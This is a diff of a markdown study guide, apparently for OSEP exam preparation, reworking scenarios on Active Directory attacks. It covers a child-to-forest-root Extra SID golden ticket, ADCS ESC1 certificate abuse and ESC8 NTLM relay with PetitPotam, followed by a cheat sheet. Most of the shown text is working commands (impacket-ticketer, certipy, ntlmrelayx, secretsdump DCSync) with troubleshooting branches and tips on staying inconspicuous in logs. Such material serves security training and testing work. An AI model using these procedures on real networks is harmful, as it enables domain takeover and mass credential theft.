 # ① Decide: on the child domain, check the trust attributes and both SIDs
 nltest /domain_trusts /all_trusts
@@ -1649,26 +1653,29 @@ ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHI
 # ② Build a golden ticket with the child krbtgt and stuff in the root domain Enterprise Admins SID
 impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
   -domain-sid <child domain SID> \
-  -extra-sid 'S-1-5-21-<ROOT-DOMAIN-SID>-519' Administrator
+  -extra-sid '<ROOT-DOMAIN-SID>-519' Administrator
+  # ROOT-DOMAIN-SID looks like S-1-5-21-x-y-z; 519 = Enterprise Admins.
+  # Do not prefix another S-1-5-21- if the SID already has one.
 export KRB5CCNAME=Administrator.ccache
 # ③ Authenticate to root domain assets (cifs or LDAP on the root DC)
 impacket-secretsdump -k -no-pass ROOTDC.corp.local
 ```
-**Scripts used**: `m12-ad-enum-linux.sh` (trust/domain SID enumeration output); `m12-laps-and-trust-notes.md` (decision table + quick reference for the Extra SID conditions).
 
-**Validation**: if `secretsdump -k` can dump the root domain `krbtgt` from the root DC, the Extra SID worked (you have a root domain identity). If you only get child domain content or are refused, filtering is in effect or the direction is wrong — take the failure branches.
+Enumerate trusts with `m12-ad-enum-linux.sh -Mode Trust`. The decision table plus Extra SID conditions are in `m12-laps-and-trust-notes.md`.
 
-**Failure branches and alternatives**:
-- The trust is external/inter-forest (SID filtering on) -> Extra SID is useless, do not burn time: switch to cross-domain ACLs (a child DA is often granted rights on some root domain resources — enumerate the root domain ACLs for child domain principals first) or look for other reachable entry points in the root domain (re-assess LAPS/delegation/certificates).
-- The one-way trust points "root -> child" (the child cannot authenticate to the root) -> neither Extra SID nor inter-realm referral tickets work; you can only use other paths inside the root domain.
-- No child krbtgt but you do control the child DA -> `secretsdump` the child DC first to get krbtgt, then build the golden ticket; if you cannot get krbtgt (you only control non-DC high privileges) -> move laterally inside the child domain until you reach a DC.
-- The golden ticket principal fails to authenticate in the root domain (TGS refused) -> check the root DC FQDN in `/etc/hosts` and whether the root domain SID in `-extra-sid` is correct (a missing `-519` suffix or a mistyped root domain SID are the most frequent mistakes).
+If `secretsdump -k` can dump the root domain `krbtgt` from the root DC, the Extra SID worked (you have a root domain identity). If you only get child domain content or are refused, filtering is in effect or the direction is wrong.
 
-**Exam / OPSEC notes**: A golden ticket is a "highest sensitivity in the domain" operation — only run it after the trust assessment confirms it (WITHIN_FOREST + a workable direction); ticketer runs locally on the attacker box and delivers no files to the target; clean up the ccache afterwards.
+If the trust is external / inter-forest (SID filtering on), Extra SID is useless — do not burn time. Switch to cross-domain ACLs (a child DA is often granted rights on some root domain resources — enumerate the root domain ACLs for child domain principals first) or look for other reachable entry points in the root domain (re-assess LAPS / delegation / certificates).
 
----
+If the one-way trust points "root → child" (the child cannot authenticate to the root), neither Extra SID nor inter-realm referral tickets work; you can only use other paths inside the root domain.
 
-#### `m12-ad-enum-linux.sh`
+If you have no child krbtgt but you do control the child DA, `secretsdump` the child DC first to get krbtgt, then build the golden ticket. If you cannot get krbtgt (you only control non-DC high privileges), move laterally inside the child domain until you reach a DC.
+
+If the golden ticket principal fails to authenticate in the root domain (TGS refused), check the root DC FQDN in `/etc/hosts` and whether the root domain SID in `-extra-sid` is correct (a doubled `S-1-5-21-` prefix, a missing `-519` suffix, or a mistyped root domain SID are the most frequent mistakes).
+
+A golden ticket is a highest-sensitivity operation — only run it after the trust assessment confirms it (WITHIN_FOREST + a workable direction). `ticketer` runs locally on the attacker box and delivers no files to the target; clean up the ccache afterwards.
+
+::: details `m12-ad-enum-linux.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -2063,7 +2070,10 @@ info "next: for LAPS hits see scenario 49; for delegation/RBCD hits see scenario
 info "      for trust + SID hits see scenario 53 (the Extra SID section of m12-laps-and-trust-notes.md)."
 ````
 
-#### `m12-laps-and-trust-notes.md`
+:::
+
+
+::: details `m12-laps-and-trust-notes.md` · click to expand
 
 ````markdown
 # m12 - reading LAPS, domain/forest trust enumeration, Extra SID and SID filtering command notes
@@ -2396,17 +2406,18 @@ whoami /groups                               # after injecting /ptt you should s
 - A clock skew >5 minutes makes every Kerberos operation fail; fix the time before you troubleshoot anything else.
 ````
 
-## Scenario 54: A low-privilege domain user can request a misconfigured certificate template (ESC1)
+:::
 
-**Situation**: ADCS is deployed in the domain; a published template meets the ESC1 conditions, and the current low-privilege user **has the right to request** it. Goal: use the certificate to obtain an administrator identity.
 
-**ESC1 conditions (all four must hold at once)**: ① the template enables **enrollee-supplied SAN** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, i.e. you can fill in `-upn`); ② the template EKU includes **Client Authentication** (`Client Authentication`, or it is an "Any Purpose" template, which you often meet in exams); ③ the template lets low-privilege users/groups **enroll** (enroll permission); ④ the template has **no** CA Manager Approval (with `CA Manager Approval` on, your request is left pending).
+## Low-priv user can request a misconfigured template (ESC1)
 
-**Assumptions**: `certipy` (Kali: `certipy-ad`) is available; the attacker can resolve and reach the CA host (LDAP/DCERPC, `/etc/hosts` if needed); the FQDNs of the DC and the CA are known.
+If ADCS is deployed and a published template meets the ESC1 conditions, and the current low-privilege user has the right to request it, use the certificate to obtain an administrator identity. All four conditions must hold at once: the template enables enrollee-supplied SAN (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, i.e. you can fill in `-upn`); the template EKU includes Client Authentication (or it is an "Any Purpose" template); the template lets low-privilege users/groups enroll; and the template has no CA Manager Approval (with approval on, your request is left pending).
 
-**Prepare (attacker side)**: run `certipy find` first for a full template enumeration that flags the exploitable ones (one enumeration gives you the CA name, the template list and who can enroll, so you do not have to guess).
+- [ ] Run `certipy find` first for a full template enumeration that flags the exploitable ones
+- [ ] Request a certificate, putting the administrator UPN in the SAN
+- [ ] Trade the certificate for the NTLM hash, then DCSync
+- [ ] If no usable ESC1 template, jump to ESC8 (next section)
 
-**Procedure**:
 ```bash
 # ① Enumerate: list -vulnerable templates and the principals that can enroll
 certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
@@ -2417,22 +2428,16 @@ certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
 certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Scripts used**: `m12-adcs-esc1-esc8.sh` (a one-shot wrapper for enumerate/req/auth plus argument templates).
 
-**Validation**: `certipy auth` prints the NTLM hash; if `secretsdump` can read `krbtgt` you are domain admin.
+`m12-adcs-esc1-esc8.sh` is a one-shot wrapper for enumerate / req / auth plus argument templates. `certipy auth` printing the NTLM hash is the check; if `secretsdump` can read `krbtgt` you are domain admin.
 
-**Failure branches and alternatives**:
-- `req` returns 0x80094012 / certificate policy does not match -> the template EKU lacks client authentication or the template is refused; try the next `-template` candidate (work from the full `certipy find` list rather than only the entries flagged vulnerable).
-- `req` returns a permission error / is refused -> the current user has no enroll right on that template; the `-upn` user does not exist or the UPN does not match; check the four ESC1 conditions one by one.
-- The request succeeds but `auth` fails -> a certificate subject/issuance time problem; re-run `req` and overwrite with `-out`; or specify `certipy auth -username administrator -domain corp.local` explicitly.
-- CA name/host resolution fails -> take `CA Name` and the DNS host name from the `find` output and point `/etc/hosts` at the real CA IP; the `-target` argument can address the CA directly.
-- No usable ESC1 template -> do not force it, jump to ESC8 (scenario 55) or another entry point.
+If `req` returns 0x80094012 / certificate policy does not match, the template EKU lacks client authentication or the template is refused; try the next `-template` candidate (work from the full `certipy find` list rather than only the entries flagged vulnerable). If `req` returns a permission error / is refused, the current user has no enroll right on that template, or the `-upn` user does not exist / the UPN does not match — check the four ESC1 conditions one by one.
 
-**Exam / OPSEC notes**: `certipy find -vulnerable` output lists every problem template in the domain — only look at the ones the scenario needs. Requesting a certificate writes to the CA log, so pick an impersonation target that fits the scenario (an administrator/machine account); do not request unrelated certificates just to "test".
+If the request succeeds but `auth` fails, it is a certificate subject / issuance time problem; re-run `req` and overwrite with `-out`, or specify `certipy auth -username administrator -domain corp.local` explicitly. If CA name / host resolution fails, take `CA Name` and the DNS host name from the `find` output and point `/etc/hosts` at the real CA IP; the `-target` argument can address the CA directly. If no usable ESC1 template, do not force it — jump to ESC8 or another entry point.
 
----
+`certipy find -vulnerable` lists every problem template in the domain — only look at the ones the scenario needs. Requesting a certificate writes to the CA log, so pick an impersonation target that fits the scenario (an administrator / machine account); do not request unrelated certificates just to "test".
 
-#### `m12-adcs-esc1-esc8.sh`
+::: details `m12-adcs-esc1-esc8.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -2799,17 +2804,20 @@ printf '\n[*] mode %s finished. Commands are printed only by default, add -x to 
 info "output directory: ${LOOT} (export certificates/PFX to the attacker in good time and clean up leftovers on the target)"
 ````
 
-## Scenario 55: No usable ESC1 template, but the CA exposes a relayable HTTP enrollment endpoint (ESC8)
+:::
 
-**Situation**: The target offers ADCS Web Enrollment (`http(s)://CA/certsrv/`); you relay a victim's NTLM authentication to the enrollment endpoint and trade it for a certificate. The classic victim: **the DC machine account** (once the relay succeeds you get a certificate for the DC identity -> exchange it for the hash -> DCSync).
 
-**Assumptions**: You already have a domain credential you can use to trigger authentication (an ordinary domain user is enough, for PetitPotam/PrinterBug); the attacker can be actively connected to by the victim (usually the DC machine account); the CA offers Web Enrollment with EPA not enabled; the relay target template allows machine accounts to enroll. If any of the three does not hold, this scenario is a dead end — verify each one before you act.
+## No ESC1 template, CA has a relayable HTTP enrollment endpoint (ESC8)
 
-**ESC8 relay conditions**: ① the CA has HTTP(S) Web Enrollment enabled (`/certsrv/certfnsh.asp`) and **EPA is not enabled** — with EPA on, the CA refuses the NTLM relay (HTTP 401), and that is the number one failure cause in this scenario; ② the template you relay to allows the victim (the DC machine account) to enroll and has an EKU usable for authentication; ③ the attacker can coerce the victim into authenticating (SpoolSample/PetitPotam/DFSCoerce) to the host running the **relay listener**.
+If the target offers ADCS Web Enrollment (`http(s)://CA/certsrv/`), relay a victim's NTLM authentication to the enrollment endpoint and trade it for a certificate. The classic victim is the DC machine account — once the relay succeeds you get a certificate for the DC identity, exchange it for the hash, then DCSync.
 
-**Prepare (attacker side)**: `impacket-ntlmrelayx` (with `--adcs` for integrated certificate requests), an authentication trigger script (`impacket-petitpotam`/`printerbug`/`dementer`), `certipy` (to use the PFX you get); configure the CA FQDN in `/etc/hosts` first.
+Three conditions must hold, and any one failing is a dead end — verify each before you act. The CA has HTTP(S) Web Enrollment enabled (`/certsrv/certfnsh.asp`) and EPA is not enabled (with EPA on, the CA refuses the NTLM relay with HTTP 401 — the number one failure cause). The template you relay to allows the victim (the DC machine account) to enroll and has an EKU usable for authentication. You can coerce the victim into authenticating (SpoolSample / PetitPotam / DFSCoerce) to the host running the relay listener. An ordinary domain user is enough to trigger.
 
-**Procedure**:
+- [ ] Configure the CA FQDN in `/etc/hosts`
+- [ ] Start ntlmrelayx with `--adcs` against the enrollment endpoint
+- [ ] Coerce the DC into authenticating to the attacker
+- [ ] Write the relayed PFX to disk and exchange it with Certipy
+
 ```bash
 # ① Start the relay: forward SMB authentication to the ADCS HTTP enrollment endpoint
 impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
@@ -2821,28 +2829,26 @@ impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
 certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Scripts used**: `m12-adcs-esc1-esc8.sh` (relay mode: start the relay + trigger + PFX handling + dependency check).
 
-**Validation**: the ntlmrelayx log shows `Got NTLMv2 hash` + `Server returned certificate`; `certipy auth` prints the NTLM hash of the victim machine account; DCSync with the DC hash succeeds.
+`m12-adcs-esc1-esc8.sh` relay mode starts the relay, the trigger, PFX handling, and a dependency check. The ntlmrelayx log showing `Got NTLMv2 hash` + `Server returned certificate`, and `certipy auth` printing the NTLM hash of the victim machine account, is the check; DCSync with the DC hash should then succeed.
 
-**Failure branches and alternatives**:
-- After the trigger the relay shows nothing / 401 -> EPA is probably enabled: if the HTTPS endpoint fails too, confirm EPA and **drop ESC8** (there is no legitimate bypass under EPA), go back to ESC1/another entry point; do not retry in a loop and waste time.
-- The trigger works but the certificate request is refused -> the template does not allow that victim to enroll, or it has no authentication EKU; change the template in `ntlmrelayx --adcs --template` (run `certipy find` first to see which templates allow Domain Computers).
-- No usable trigger vector (all RPC paths patched or firewalled) -> ESC8 has no source of victim authentication and is not viable; move to another module's entry point.
-- The relay yields a certificate for a low-value account -> change the trigger target (triggering a domain admin logon session is hard to control, the DC machine account is the most reliable).
+If after the trigger the relay shows nothing / 401, EPA is probably enabled. If the HTTPS endpoint fails too, confirm EPA and drop ESC8 (there is no legitimate bypass under EPA) — go back to ESC1 / another entry point; do not retry in a loop and waste time.
 
-**Exam / OPSEC notes**: `ntlmrelayx` receives and forwards authentication and its log holds credential hashes, so run it from `~/osep/logs` and clean up afterwards; the CA's HTTP log records every relayed request — prefer the DC machine account as the victim (behaviorally it looks like a normal machine auto-enrolling), and avoid forging a domain admin request that leaves an obvious anomaly.
+If the trigger works but the certificate request is refused, the template does not allow that victim to enroll, or it has no authentication EKU. Change the template in `ntlmrelayx --adcs --template` (run `certipy find` first to see which templates allow Domain Computers).
 
----
+If no usable trigger vector (all RPC paths patched or firewalled), ESC8 has no source of victim authentication and is not viable; move to another module's entry point. If the relay yields a certificate for a low-value account, change the trigger target (triggering a domain admin logon session is hard to control; the DC machine account is the most reliable).
 
-## Appendix: the minimal shared preparation checklist for this module (attacker side)
+`ntlmrelayx` receives and forwards authentication and its log holds credential hashes, so run it from `~/osep/logs` and clean up afterwards. The CA's HTTP log records every relayed request — prefer the DC machine account as the victim (behaviorally it looks like a normal machine auto-enrolling), and avoid forging a domain admin request that leaves an obvious anomaly.
 
-```bash
-# install everything in one go (Kali)
-sudo apt install -y impacket-scripts ldap-utils krb5-user   # put DOMAIN in the Realm prompt
-pipx install certipy-ad
-# DNS convenience: put the DC/CA/target FQDNs in /etc/hosts (Kerberos does not allow IPs)
-# ticket directory
-mkdir -p ~/osep/tickets ~/osep/loot/certs
-```
-Windows-side tools (copy to the target host, from a fixed source): `Rubeus.exe`, `SpoolSample.exe` (or the single-file printerbug), `SharpHound.exe` (enumeration aid, not required). **If impacket is not installed, just `python3 -m pip install impacket` and call the modules**, and take the command names from the Kali packaging (`impacket-wmiexec` and friends).
+## Cheat sheet
+
+| You want to… | Use |
+|---|---|
+| Use a Linux-side ticket against a Windows service | `m12-kerberos-tickets-linux.sh`; `smbclient -k` / `impacket-wmiexec -k -no-pass` |
+| Read LAPS (legacy or Windows) | `m12-ad-enum-windows.ps1 -Mode LAPS` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
+| Unconstrained delegation → DC TGT → DCSync | `m12-delegation-attacks.ps1 -Mode Unconstrained`; `Rubeus monitor` + coerce + `ticketConverter` |
+| RBCD (write `AllowedToAct`) | `m12-delegation-attacks.ps1 -Mode RBCD`; `addcomputer` → `getST -impersonate` |
+| Constrained delegation S4U | `m12-delegation-attacks.ps1 -Mode Constrained`; `impacket-getST -spn ... -impersonate` |
+| Child domain → forest root (Extra SID) | `m12-ad-enum-linux.sh -Mode Trust` + `impacket-ticketer -extra-sid '<SID>-519'` |
+| ESC1 misconfigured template | `m12-adcs-esc1-esc8.sh`; `certipy find` → `req -upn` → `auth` |
+| ESC8 HTTP enrollment relay | `m12-adcs-esc1-esc8.sh` relay mode; `ntlmrelayx --adcs` + PetitPotam |
